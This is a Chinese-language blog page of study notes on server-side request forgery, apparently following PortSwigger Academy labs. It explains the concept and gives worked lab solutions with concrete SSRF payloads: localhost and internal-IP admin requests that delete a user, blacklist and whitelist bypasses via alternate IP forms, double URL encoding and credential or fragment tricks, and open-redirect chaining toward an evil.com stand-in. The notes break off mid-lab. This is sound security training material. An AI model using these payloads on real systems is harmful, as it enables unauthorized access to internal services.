<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="hr1sto">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Server-side request forgery (SSRF)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/" class="article-date">
  <time class="dt-published" datetime="2026-01-18T20:01:37.000Z" itemprop="datePublished">2026-01-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/">3.Server-side request forgery (SSRF)</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2026.1.19</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient">https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient</a></p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet">https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet</a></p>
<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>服务器端请求伪造（SSRF）是一种网络安全漏洞，攻击者可利用此漏洞使服务器端应用程序向非预期位置发起请求。在典型的SSRF攻击中，攻击者可能诱使服务器连接至组织内部基础设施中的仅限内部访问的服务。在其他情况下，攻击者可能迫使服务器连接至任意外部系统，从而导致敏感数据泄露，例如授权凭证。</p>
<h2 id="1-1-SSRF攻击会产生什么影响？"><a href="#1-1-SSRF攻击会产生什么影响？" class="headerlink" title="1.1 SSRF攻击会产生什么影响？"></a>1.1 SSRF攻击会产生什么影响？</h2><p>成功的SSRF攻击通常会导致组织内部发生未经授权的操作或数据访问。这种攻击可能发生在存在漏洞的应用程序中，也可能发生在该应用程序可通信的其他后端系统上。在某些情况下，SSRF漏洞可能允许攻击者执行任意命令。若SSRF漏洞利用导致连接外部第三方系统，可能引发恶意后续攻击，且攻击源头看似来自托管漏洞应用的组织。</p>
<h2 id="1-2-常见SSRF攻击方式"><a href="#1-2-常见SSRF攻击方式" class="headerlink" title="1.2 常见SSRF攻击方式"></a>1.2 常见SSRF攻击方式</h2><p>SSRF攻击常利用信任关系，从漏洞应用发起攻击并执行未授权操作。此类信任关系可能存在于服务器之间，或同一组织内的其他后端系统之间。</p>
<h3 id="1-2-1-针对服务器的SSRF攻击"><a href="#1-2-1-针对服务器的SSRF攻击" class="headerlink" title="1.2.1 针对服务器的SSRF攻击"></a>1.2.1 针对服务器的SSRF攻击</h3><p> 在针对服务器的SSRF攻击中，攻击者诱使应用程序通过其回环网络接口向托管该应用的服务器发起HTTP请求。这通常涉及提供包含127.0.0.1（指向回环适配器的保留IP地址）或localhost（该适配器的常用名称）等主机名的URL。例如，假设某购物应用允许用户查询商品在特定门店的库存状态。为提供库存信息，该应用需调用多个后端REST API。其实现方式是通过前端HTTP请求将URL传递至相关后端API接口。当用户查询商品库存时，其浏览器将发起如下请求：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</span><br></pre></td></tr></table></figure>

<p>这将促使服务器向指定URL发起请求，获取库存状态并返回给用户。在此示例中，攻击者可修改请求指向服务器本地URL：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://localhost/admin</span><br></pre></td></tr></table></figure>

<p>服务器将获取&#x2F;admin URL的内容并返回给用户。攻击者虽可访问&#x2F;admin网址，但管理功能通常仅限认证用户使用。这意味着攻击者无法获取有价值的信息。然而，若对&#x2F;admin网址的请求来自本地机器，常规访问控制将被绕过。由于请求看似来自可信位置，应用程序会授予管理功能的完全访问权限。</p>
<p>为什么应用程序会这样行为，并默认信任来自本地机器的请求？这可能由多种原因导致：</p>
<p>• 访问控制检查可能由位于应用服务器前端的其他组件实现。当连接回服务器时，该检查会被绕过。</p>
<p>• 为灾难恢复目的，应用程序可能允许来自本地机器的任何用户无需登录即可进行管理访问。这为管理员在遗失凭证时提供了系统恢复途径，其前提是仅完全可信用户会直接访问服务器端。</p>
<p>• 管理界面可能监听与主应用程序不同的端口号，用户无法直接访问。</p>
<p>此类信任关系——即本地机器发起的请求与普通请求获得不同处理——往往使SSRF成为关键漏洞。</p>
<h3 id="1-2-2-SSRF-attacks-against-other-back-end-systems"><a href="#1-2-2-SSRF-attacks-against-other-back-end-systems" class="headerlink" title="1.2.2 SSRF attacks against other back-end systems"></a>1.2.2 SSRF attacks against other back-end systems</h3><p>针对其他后端系统的SSRF攻击在某些情况下，应用服务器能够与用户无法直接访问的后端系统交互。这些系统通常采用不可路由的私有IP地址。由于后端系统通常受到网络拓扑的保护，其安全防护措施往往较为薄弱。多数情况下，内部后端系统包含敏感功能模块，任何能与系统交互的用户均可未经认证直接访问。以先前示例为例，假设后端存在管理接口<a target="_blank" rel="noopener" href="https://192.168.0.68/admin%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E6%8F%90%E4%BA%A4%E4%BB%A5%E4%B8%8B%E8%AF%B7%E6%B1%82%E5%88%A9%E7%94%A8SSRF%E6%BC%8F%E6%B4%9E%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%EF%BC%9APOST">https://192.168.0.68/admin。攻击者可提交以下请求利用SSRF漏洞访问管理界面：POST</a> &#x2F;product&#x2F;stock HTTP&#x2F;1.0<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 118</p>
<p>stockApi&#x3D;<a target="_blank" rel="noopener" href="http://192.168.0.68/admin">http://192.168.0.68/admin</a></p>
<p>‍</p>
<h2 id="1-3-绕过常见的SSRF防御"><a href="#1-3-绕过常见的SSRF防御" class="headerlink" title="1.3 绕过常见的SSRF防御"></a>1.3 绕过常见的SSRF防御</h2><p>在存在SSRF（服务器端请求伪造）行为的应用程序中，通常会部署防御机制以防止恶意利用。然而，这些防御措施往往可以被绕过。</p>
<h3 id="1-3-1-黑名单"><a href="#1-3-1-黑名单" class="headerlink" title="1.3.1 黑名单"></a>1.3.1 黑名单</h3><p>当应用程序使用基于黑名单的输入过滤来阻止包含如127.0.0.1、localhost等主机名或类似&#x2F;admin等敏感URL时，攻击者可通过多种方式规避此类限制：</p>
<ul>
<li>使用127.0.0.1的其他IP表示形式，例如十进制数2130706433、八进制数017700000001，或简写形式127.1；</li>
<li>注册一个指向127.0.0.1的自定义域名，例如可使用spoofed.burpcollaborator.net实现此目的；</li>
<li>对被拦截的字符串进行混淆处理，例如通过URL编码或改变字母大小写；</li>
<li>提供一个由攻击者控制的URL，该URL会重定向至目标地址。可尝试使用不同类型的重定向状态码以及不同的目标协议（例如，在重定向前从http:切换为https:），已有案例表明这种方式可绕过部分反SSRF过滤机制。</li>
</ul>
<h3 id="1-3-2-基于白名单的输入过滤器下的SSRF"><a href="#1-3-2-基于白名单的输入过滤器下的SSRF" class="headerlink" title="1.3.2 基于白名单的输入过滤器下的SSRF"></a>1.3.2 基于白名单的输入过滤器下的SSRF</h3><p>某些应用程序仅允许输入与白名单中允许值匹配的内容。该过滤器可能在输入开头或输入内容中查找匹配项。您可能通过<strong>利用URL解析中的不一致性</strong>来绕过此过滤器。URL规范包含若干特性，当采用此方法进行临时解析和验证时极易被忽略：</p>
<ol>
<li><p>URL 凭证语法scheme:&#x2F;&#x2F;user:password@host：</p>
<p>开发者可能编写代码检查 URL 是否以 <code>http://whitelist.com</code>​ <strong>开头，</strong> 后端 HTTP 库（如 cURL、Python Requests 等）会将 <code>@</code>​ 之前的内容识别为“用户名&#x2F;密码”，而将 <code>@</code> 之后的内容识别为真正的“目标主机”。</p>
<p>payload:<code>http://whitelist.com:fakePassword@evil.com</code></p>
</li>
<li><p>URL 中 <code>#</code>​ 之后的内容被称为“片段标识符”（Fragment），通常仅在客户端使用，服务器发起请求时往往会截断它。开发者可能编写代码检查 URL 中是否 <strong>包含</strong> <code>whitelist.com</code>​ 字符串。攻击者将白名单域名放在片段中，满足了“包含”条件，但实际请求的目标是片段前的域名。过滤器检测到字符串中存在 <code>whitelist.com</code>​，予以放行。但后端 HTTP 库在处理请求时，通常会丢弃 <code>#</code>​ 及其后的内容，从而请求 <code>evil.com</code>。</p>
<p>payload:<code>http://evil.com/path?query=1#whitelist.com</code></p>
</li>
<li><p>利用 DNS 命名层级（Subdomains）:你在你控制的域名（<code>evil.com</code>）下创建一个子域名，将其命名为与白名单一致。</p>
<p>payload:<code>http://whitelist.com.evil.com</code></p>
</li>
<li><p>利用 URL 编码与双重编码（Encoding）:利用验证层（过滤器）和执行层（后端 HTTP 库）对 URL 解码时机的不同。</p>
</li>
</ol>
<ul>
<li><p><strong>过滤器逻辑：</strong>  过滤器可能在解码前进行匹配，或者禁止了特定字符（如 <code>@</code>​），但允许 <code>%</code>。</p>
</li>
<li><p><strong>绕过原理：</strong></p>
<ul>
<li><strong>单次编码：</strong>  将特殊字符（如 <code>@</code>​）编码为 <code>%40</code>。如果过滤器只是简单的字符串查找，它可能看不出这是个凭证结构。</li>
<li><strong>双重编码：</strong>  将 <code>%</code>​ 本身也编码（<code>%</code>​ -&gt; <code>%25</code>）。如果前端防火墙解码一次，后端应用解码一次，就会产生差异。</li>
</ul>
</li>
</ul>
<p>payload:<a href="http://whitelist.com%40evil.com">http://whitelist.com%40evil.com</a>   或  <a href="http://whitelist.com%2540evil.com">http://whitelist.com%2540evil.com</a></p>
<p>在防御较强的环境中，往往需要组合上述技术。</p>
<h3 id="1-3-3-通过开放重定向绕过SSRF过滤器"><a href="#1-3-3-通过开放重定向绕过SSRF过滤器" class="headerlink" title="1.3.3 通过开放重定向绕过SSRF过滤器"></a>1.3.3 通过开放重定向绕过SSRF过滤器</h3><p>只要用于发起后端HTTP请求的API支持重定向，即可构造满足过滤器要求的URL，从而将请求重定向至目标后端。例如，某应用存在开放重定向漏洞，当访问以下URL时：</p>
<p>&#x3D;&#x3D;&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;<a target="_blank" rel="noopener" href="http://evil-user.net==/">http://evil-user.net==</a></p>
<p>会重定向至：</p>
<p><a target="_blank" rel="noopener" href="http://evil-user.net/">http://evil-user.net</a></p>
<p>此时可利用该漏洞绕过URL过滤器，并通过以下方式利用SSRF漏洞：</p>
<p>​<code>POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118</code></p>
<p>​<code>stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</code></p>
<p>此SSRF攻击成立的原因在于：应用程序首先验证提供的stockAPI网址是否属于允许域（该网址确实属于允许域）。随后应用程序请求该URL，触发开放重定向机制。系统将遵循重定向路径，向攻击者指定的内部URL发起请求。</p>
<h2 id="1-4-Blind-SSRF-vulnerabilities"><a href="#1-4-Blind-SSRF-vulnerabilities" class="headerlink" title="1.4 Blind SSRF vulnerabilities"></a>1.4 Blind SSRF vulnerabilities</h2><p>盲SSRF漏洞是指当应用程序被诱导向指定URL发起后端HTTP请求时，后端请求的响应内容不会出现在应用程序前端响应中的漏洞，有时可导致在服务器或其他后端组件上实现完整的远程代码执行。</p>
<h3 id="1-4-1-如何发现并利用盲SSRF漏洞？"><a href="#1-4-1-如何发现并利用盲SSRF漏洞？" class="headerlink" title="1.4.1 如何发现并利用盲SSRF漏洞？"></a>1.4.1 如何发现并利用盲SSRF漏洞？</h3><p>检测盲SSRF漏洞最可靠的方法是采用带外攻击（OAST）技术。具体操作包括：</p>
<p>尝试向受控外部系统触发HTTP请求，并监测与该系统的网络交互。</p>
<p>运用带外技术的最简便高效方式是使用Burp Collaborator。通过该工具可生成唯一域名，将其封装在有效负载中发送至应用程序，并监测与这些域名的交互。若观察到应用程序发出的入站HTTP请求，则表明存在SSRF漏洞。</p>
<p>在测试SSRF漏洞时，常见现象是观察到对指定协作方域名的DNS解析操作，但后续未产生HTTP请求。这种情况通常源于应用程序尝试向该域名发起HTTP请求，触发了初始DNS解析，但实际HTTP请求被网络层过滤机制拦截。基础设施允许外发DNS流量的情况较为普遍——因其在众多场景中不可或缺——但会阻断指向意外目标的HTTP连接。</p>
<p>仅识别出可触发带外HTTP请求的盲SSRF漏洞本身并不能提供可利用路径。由于无法查看后端请求的响应，该行为无法用于探索应用服务器可访问系统中的内容。但仍可利用其探测服务器本身或其他后端系统上的其他漏洞。可&#x3D;&#x3D;对内部IP地址空间进行盲扫，发送专门用于检测已知漏洞的有效载荷&#x3D;&#x3D;。若这些有效载荷同时采用盲外带技术，则可能发现未打补丁的内部服务器上存在关键漏洞。</p>
<p>利用盲SSRF漏洞的另一种途径是诱使应用程序连接至攻击者控制的系统，并向发起连接的HTTP客户端返回恶意响应。若能利用服务器HTTP实现中的严重客户端漏洞，攻击者可能在应用程序基础设施内实现远程代码执行。</p>
<h2 id="1-5-Finding-hidden-attack-surface-for-SSRF-vulnerabilities"><a href="#1-5-Finding-hidden-attack-surface-for-SSRF-vulnerabilities" class="headerlink" title="1.5 Finding hidden attack surface for SSRF vulnerabilities"></a>1.5 Finding hidden attack surface for SSRF vulnerabilities</h2><p>许多服务器端请求伪造漏洞很容易被发现，因为应用程序的正常流量涉及包含完整URL的请求参数。而其他类型的SSRF漏洞则更难定位。请求中的部分URL有时，应用程序仅将主机名或URL路径的一部分放入请求参数中。提交的值随后会在服务器端被整合成完整的URL进行请求。如果该值能被轻易识别为主机名或URL路径，潜在的攻击面可能显而易见。但由于无法控制请求的完整URL，其作为完整SSRF漏洞的可利用性可能受限。数据格式内的URL 某些应用采用允许包含URL的数据格式进行传输，这些URL可能被格式解析器调用请求。</p>
<p>XML数据格式便是典型案例，该格式被广泛应用于Web应用程序中，用于在客户端与服务器间传输结构化数据。当应用程序接收XML格式数据并进行解析时，可能存在XXE注入漏洞，同时亦可能通过XXE漏洞引发SSRF攻击。我们将在探讨XXE注入漏洞时对此进行详细说明。 通过Referer头引发的SSRF 部分应用程序使用服务器端分析软件追踪访问者。这类软件通常会记录请求中的Referer标头，以便追踪来源链接。分析软件常会访问Referer标头中出现的第三方URL，此举通常用于分析来源网站内容，包括来源链接使用的锚文本。因此，Referer标头往往成为SSRF漏洞的有效攻击面。有关涉及Referer标头的漏洞示例，请参阅盲SSRF漏洞相关章节。</p>
<h1 id="2-实验"><a href="#2-实验" class="headerlink" title="2.实验"></a>2.实验</h1><h2 id="Lab-Basic-SSRF-against-the-local-server"><a href="#Lab-Basic-SSRF-against-the-local-server" class="headerlink" title="Lab: Basic SSRF against the local server"></a>Lab: Basic SSRF against the local server</h2><p>该实验室具备库存检查功能，该功能从内部系统获取数据。为完成实验，请将库存检查URL修改为访问管理界面<a target="_blank" rel="noopener" href="http://localhost/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82">http://localhost/admin，并删除用户carlos。</a></p>
<p><img src="/images/image-20251201221901-ymw4141.png" alt="image"></p>
<p><img src="/images/image-20251201221926-j2plhqf.png" alt="image"></p>
<p>观察到删除的参数，修改stockapi的参数：</p>
<p><img src="/images/image-20251201222147-0u1e0zr.png" alt="image"></p>
<p><img src="/images/image-20251201222230-8e4v0fy.png" alt="image"></p>
<h2 id="Lab-Basic-SSRF-against-another-back-end-system"><a href="#Lab-Basic-SSRF-against-another-back-end-system" class="headerlink" title="Lab: Basic SSRF against another back-end system"></a>Lab: Basic SSRF against another back-end system</h2><p>该实验室具备库存检查功能，可从内部系统获取数据。为完成实验，请使用库存检查功能扫描内部192.168.0.X网络段，查找端口8080上的管理界面，随后通过该界面删除用户carlos。</p>
<p>‍</p>
<p>访问产品页面，点击“检查库存”，在Burp Suite中拦截请求并发送至Burp Intruder。2. 将stockApi参数修改为<a target="_blank" rel="noopener" href="http://192.168.0.1:8080/admin%EF%BC%8C%E9%80%89%E4%B8%ADIP%E5%9C%B0%E5%9D%80%E6%9C%AB%E4%BD%8D%E5%AD%97%E8%8A%82%EF%BC%88%E6%95%B0%E5%AD%971%EF%BC%89%E5%90%8E%E7%82%B9%E5%87%BB%E6%B7%BB%E5%8A%A0%C2%A7%E3%80%823">http://192.168.0.1:8080/admin，选中IP地址末位字节（数字1）后点击添加§。3</a>. 在有效载荷侧边栏中，将有效载荷类型改为数字，分别在起始值、终止值和步长框中输入1、255和1。4. 点击开始攻击。5. 点击状态列按状态码升序排序。应出现一条状态码为200的条目，显示管理界面。6. 点击该请求，将其发送到Burp Repeater，并将stockApi中的路径修改为：&#x2F;admin&#x2F;delete?username&#x3D;carlos</p>
<p><img src="/images/image-20251202174847-kda9f3f.png" alt="image"></p>
<p>记得url编码</p>
<h2 id="Lab-SSRF-with-blacklist-based-input-filter"><a href="#Lab-SSRF-with-blacklist-based-input-filter" class="headerlink" title="Lab: SSRF with blacklist-based input filter"></a>Lab: SSRF with blacklist-based input filter</h2><p>该实验室具备库存检查功能，该功能从内部系统获取数据。为完成实验，请将库存检查URL修改为访问管理界面<a target="_blank" rel="noopener" href="http://localhost/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82%E5%BC%80%E5%8F%91%E8%80%85%E9%83%A8%E7%BD%B2%E4%BA%86%E4%B8%A4%E7%A7%8D%E5%BC%B1%E6%8A%97SSRF%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%EF%BC%8C%E6%82%A8%E9%9C%80%E8%A6%81%E7%BB%95%E8%BF%87%E8%BF%99%E4%BA%9B%E9%98%B2%E5%BE%A1%E3%80%82">http://localhost/admin，并删除用户carlos。开发者部署了两种弱抗SSRF防御机制，您需要绕过这些防御。</a></p>
<p>访问商品页面，点击”查看库存”，在Burp Suite中拦截请求并转发至Burp Repeater。2. 将stockApi参数中的URL修改为<a target="_blank" rel="noopener" href="http://127.0.0.1/%EF%BC%8C%E8%A7%82%E5%AF%9F%E8%AF%B7%E6%B1%82%E8%A2%AB%E6%8B%A6%E6%88%AA%E3%80%823">http://127.0.0.1/，观察请求被拦截。3</a>. 通过将URL改为：<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1/</a> 绕过拦截。4. 将URL改为<a target="_blank" rel="noopener" href="http://127.0.0.1/admin%EF%BC%8C%E8%A7%82%E5%AF%9FURL%E5%86%8D%E6%AC%A1%E8%A2%AB%E6%8B%A6%E6%88%AA%E3%80%825">http://127.1/admin，观察URL再次被拦截。5</a>. 将”a”进行双重URL编码为%2561实现混淆，从而访问管理界面并删除目标用户。</p>
<p>‍</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1_"external/">http://127.0.0.1_&quot;External</a> stock check blocked for security reasons”</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1</a>      HTTP&#x2F;2 200 OK</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/admin">http://127.1/admin</a>      “External stock check blocked for security reasons”</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45">http://127.1/%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45</a>      HTTP&#x2F;2 200 OK</p>
<p><img src="/images/image-20251202210013-zvuvoq2.png" alt="image"></p>
<p>双重url编码：</p>
<p><img src="/images/image-20251202203730-0ghn6xn.png" alt="image"></p>
<h2 id="Lab-SSRF-with-whitelist-based-input-filter"><a href="#Lab-SSRF-with-whitelist-based-input-filter" class="headerlink" title="Lab: SSRF with whitelist-based input filter"></a>Lab: SSRF with whitelist-based input filter</h2><p>该实验室具备库存查询功能，该功能从内部系统获取数据。<br>为完成实验，请将库存查询网址修改为访问管理界面：<a target="_blank" rel="noopener" href="http://localhost/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82">http://localhost/admin，并删除用户carlos。</a><br>开发者部署了反SSRF防御机制，您需要绕过该机制。</p>
<p>‍</p>
<ol>
<li><p>访问商品页面，点击”查看库存”，在Burp Suite中拦截请求并转发至Burp Repeater。</p>
</li>
<li><p>将stockApi参数中的URL修改为<a target="_blank" rel="noopener" href="http://127.0.0.1/%EF%BC%8C%E8%A7%82%E5%AF%9F%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E8%A7%A3%E6%9E%90URL%E3%80%81%E6%8F%90%E5%8F%96%E4%B8%BB%E6%9C%BA%E5%90%8D%E5%B9%B6%E8%BF%9B%E8%A1%8C%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%87%E7%A8%8B%E3%80%82">http://127.0.0.1/，观察应用程序解析URL、提取主机名并进行白名单验证的过程。</a></p>
<p><img src="/images/image-20251203093330-vqfn1to.png" alt="image"></p>
</li>
<li><p>将URL改为<a target="_blank" rel="noopener" href="http://username@stock.weliketoshop.net/%EF%BC%8C%E8%A7%82%E5%AF%9F%E8%AF%B7%E6%B1%82%E8%A2%AB%E6%8E%A5%E5%8F%97%EF%BC%8C%E8%A1%A8%E6%98%8EURL%E8%A7%A3%E6%9E%90%E5%99%A8%E6%94%AF%E6%8C%81%E5%B5%8C%E5%85%A5%E5%87%AD%E8%AF%81%E3%80%82">http://username@stock.weliketoshop.net/，观察请求被接受，表明URL解析器支持嵌入凭证。</a></p>
</li>
</ol>
<p><img src="/images/image-20251203093512-drpjpzi.png" alt="image"></p>
<ol start="4">
<li><pre><code class="xml">在用户名前添加#符号，观察URL被拒绝。
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```txt</span><br><span class="line">Double-URL encode the # to %2523，观察到极其可疑的&quot;Internal Server Error&quot;响应，</span><br><span class="line">表明服务器可能尝试连接至&quot;username&quot;。</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
<p><img src="/images/image-20251203093652-c5vrxfc.png" alt="image"></p>
<ol start="5">
<li>访问管理界面并删除目标用户时，将URL修改为： <a target="_blank" rel="noopener" href="http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos">http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</a></li>
</ol>
<p><img src="/images/image-20251203093736-6dpnqdu.png" alt="image"></p>
<p>‍</p>
<p><img src="/images/image-20251203095137-zaxeqyd.png" alt="image"></p>
<p>‍</p>
<p>http%3A%2F%2Flocalhost%<a href="mailto:&#x32;&#x35;&#50;&#x33;&#64;&#115;&#x74;&#111;&#x63;&#x6b;&#x2e;&#119;&#101;&#x6c;&#105;&#x6b;&#x65;&#x74;&#x6f;&#115;&#x68;&#111;&#112;&#x2e;&#110;&#101;&#116;">&#x32;&#x35;&#50;&#x33;&#64;&#115;&#x74;&#111;&#x63;&#x6b;&#x2e;&#119;&#101;&#x6c;&#105;&#x6b;&#x65;&#x74;&#x6f;&#115;&#x68;&#111;&#112;&#x2e;&#110;&#101;&#116;</a>&#x2F;admin&#x2F;delete?username&#x3D;carlos</p>
<p><img src="/images/image-20251203095001-ty9qe41.png" alt="image"></p>
<ul>
<li>​ <strong>​<code>#</code>​</strong> ​ <strong>字符（片段标识符&#x2F;锚点）</strong>  标记了 URL 中资源的 ​<strong>局部位置</strong>。</li>
<li><strong>最关键的是：</strong>  当一个 URL 被 HTTP 客户端（如浏览器或底层的 HTTP 库）解析时，​ <strong>​<code>#</code>​</strong> ​ <strong>及其后面的所有内容通常不会被发送到服务器端</strong>。它是客户端本地使用的。</li>
</ul>
<p>会将 <code>#</code>​ 视为 URL 路径的一部分，然后将 <code>@</code>​ 识别为用户凭证分隔符。将 <code>@</code>​ <strong>后面的部分</strong> 视为 <strong>真正的主机名，</strong> 而将 <code>@</code>​ <strong>前面的部分</strong> (<code>localhost/#</code>) 视为用户名&#x2F;密码</p>
<p>​<code>localhost</code>​ 的作用是 <strong>满足前端&#x2F;过滤器的白名单或格式检查</strong>，防止其触发 500 错误，从而让你的 payload 能顺利进入 URL 解析器阶段。</p>
<h2 id="Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability"><a href="#Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability" class="headerlink" title="Lab: SSRF with filter bypass via open redirection vulnerability"></a>Lab: SSRF with filter bypass via open redirection vulnerability</h2><p>该实验室具备库存检查功能，该功能从内部系统获取数据。为完成实验，请将库存检查URL修改为访问管理界面<a target="_blank" rel="noopener" href="http://192.168.0.12:8080/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82%E5%BA%93%E5%AD%98%E6%A3%80%E6%9F%A5%E7%A8%8B%E5%BA%8F%E5%B7%B2%E8%A2%AB%E9%99%90%E5%88%B6%E4%BB%85%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%9B%A0%E6%AD%A4%E6%82%A8%E9%9C%80%E8%A6%81%E5%85%88%E6%89%BE%E5%88%B0%E5%BD%B1%E5%93%8D%E8%AF%A5%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E3%80%82">http://192.168.0.12:8080/admin，并删除用户carlos。库存检查程序已被限制仅访问本地应用程序，因此您需要先找到影响该应用程序的开放重定向漏洞。</a></p>
<ol>
<li><p>访问商品页面，点击”查看库存”，在Burp Suite中拦截请求并转发至Burp Repeater。</p>
</li>
<li><p>尝试篡改stockApi参数，观察到无法使服务器直接向其他主机发送请求。</p>
</li>
<li><p>点击”下一件商品”，观察到路径参数被放入重定向响应的Location头中，导致开放重定向漏洞。</p>
<p><img src="/images/image-20251203100623-te97z2u.png" alt="image"></p>
</li>
<li><p>构建利用开放重定向漏洞的URL，使其跳转至管理界面，并将此链接填入库存查询器的stockApi参数：&#x2F;product&#x2F;nextProduct?path&#x3D;<a target="_blank" rel="noopener" href="http://192.168.0.12:8080/admin">http://192.168.0.12:8080/admin</a></p>
</li>
</ol>
<p>   <img src="/images/image-20251203100859-g1eiab2.png" alt="image"><br>5. 观察库存查询器跟随重定向跳转至管理页面。<br>6. 修改路径删除目标用户：&#x2F;product&#x2F;nextProduct?path&#x3D;<a target="_blank" rel="noopener" href="http://192.168.0.12:8080/admin/delete?username=carlos">http://192.168.0.12:8080/admin/delete?username=carlos</a></p>
<h2 id="Lab-Blind-SSRF-with-out-of-band-detection"><a href="#Lab-Blind-SSRF-with-out-of-band-detection" class="headerlink" title="Lab: Blind SSRF with out-of-band detection"></a>Lab: Blind SSRF with out-of-band detection</h2><p>本网站使用分析软件，当产品页面加载时，该软件会获取Referer头中指定的URL。为完成实验，请利用此功能触发向公共Burp协作服务器发送HTTP请求。</p>
<ol>
<li>访问某个产品页面，在Burp Suite中拦截请求并转发至Burp Repeater。</li>
